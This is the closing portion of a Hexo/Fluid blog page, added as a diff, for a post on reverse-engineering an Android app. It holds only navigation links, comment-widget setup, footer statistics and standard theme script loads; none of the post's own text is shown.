+                      <a href="/blog/2023/11/20/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" title="终端安全白皮书--身份认证">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">终端安全白皮书--身份认证</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blog/2023/11/17/Linux-Systemd%E5%AD%A6%E4%B9%A0/" title="Linux Systemd介绍">
+                        <span class="hidden-mobile">Linux Systemd介绍</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="SOHUCS" sid='https://chujian521.github.io/blog/2023/11/19/%E4%B8%80%E6%AC%A1%E5%AF%B9Android-APP%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/'></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#SOHUCS', function() {
+      Fluid.utils.createScript("https://changyan.sohu.com/upload/changyan.js", function() {
+        window.changyan.api.config({"appid":"cywkrFUjM","appkey":"4ccd03889a49ffa3059780af8bbbc0e2"})
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!--浏览器整蛊标题-->
+  <script type="text/javascript" src="\js\funnyTitle.js"></script>
+  <!--动态线条背景
+  <script type="text/javascript"
+    color="255,69,0" opacity='0.7' zIndex="-1" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>-->
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
